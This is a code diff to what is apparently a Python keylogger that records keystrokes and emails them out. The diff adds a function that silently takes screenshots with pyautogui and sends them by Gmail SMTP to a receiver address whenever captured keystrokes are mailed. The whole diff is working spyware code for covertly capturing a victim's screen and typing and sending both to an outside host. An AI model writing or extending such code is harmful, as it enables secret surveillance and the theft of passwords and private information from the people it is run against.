@@ -8,7 +8,10 @@ import getpass
 import sys
 import json
 import shutil
-
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+import pyautogui
 
 keys = []
 keys_pressed = 0
@@ -35,6 +38,38 @@ except:
 
 JsonPath = f"{path}/config.json"
 
+
+def screenshot(sender_email,receiver_email,sender_password):
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    msg['Subject'] = "SCREENSHOT"
+
+    # Attach the text message
+    msg.attach(MIMEText("scren", 'plain'))
+
+    screenshot = pyautogui.screenshot()
+    screenshot.save("./SCREENSHOT.png")
+    image_path = "./SCREENSHOT.png"
+    with open(image_path, "rb") as image_file:
+        image = MIMEImage(image_file.read())
+        image.add_header('Content-Disposition', 'attachment', filename="image.jpg")
+        msg.attach(image)
+        
+    # Connect to the SMTP server
+    smtp_server = "smtp.gmail.com"  # Change this to your email provider's SMTP server
+    smtp_port = 587  # Port for TLS
+    smtp_username = sender_email
+    smtp_password = sender_password
+
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(smtp_username, smtp_password)
+
+    # Send the email
+    server.sendmail(sender_email, receiver_email, msg.as_string())
+    server.quit()
+    os.remove("./SCREENSHOT.PNG")
 
 
 #!# -----------------------------------CAPS-LOCK----------------------------------- #!#
@@ -143,6 +178,7 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):
             message = UNmessage.replace("'","")
             message = message.replace("_Apostro4phe_","'")
             email(message)
+            screenshot(senderEmail,receiverEmail,senderPassword)
             emailBool = False
             keys = []
     def isMaillable():
